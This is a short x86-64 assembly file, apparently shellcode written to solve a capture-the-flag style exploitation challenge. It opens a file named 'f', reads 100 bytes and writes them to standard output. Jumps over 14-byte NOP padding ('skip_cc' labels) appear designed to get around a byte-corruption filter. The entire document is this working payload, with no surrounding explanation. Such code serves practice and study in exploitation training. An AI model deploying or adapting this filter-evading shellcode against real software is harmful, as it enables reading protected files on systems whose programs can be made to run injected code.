.intel_syntax noprefix
.global _start
_start:


// int fd = open("f", 0);
push 'f'
mov rdi, rsp
mov al, 2
jmp skip_cc_first 
.rept 14
nop
.endr
skip_cc_first:
xor esi, esi
syscall

// read(fd, buff, 100);
xchg eax, edi
jmp skip_cc_second
.rept 14
nop
.endr
skip_cc_second:
xor eax, eax
push rsp
pop rsi
jmp skip_cc_third
.rept 14
nop
.endr
skip_cc_third:
mov dl, 100
syscall

// write(1, buff, 100);
jmp skip_cc_fourth
.rept 14
nop
.endr
skip_cc_fourth:
mov al, 1
jmp skip_cc_fifth
.rept 14
nop
.endr
skip_cc_fifth:
mov dil, 1
syscall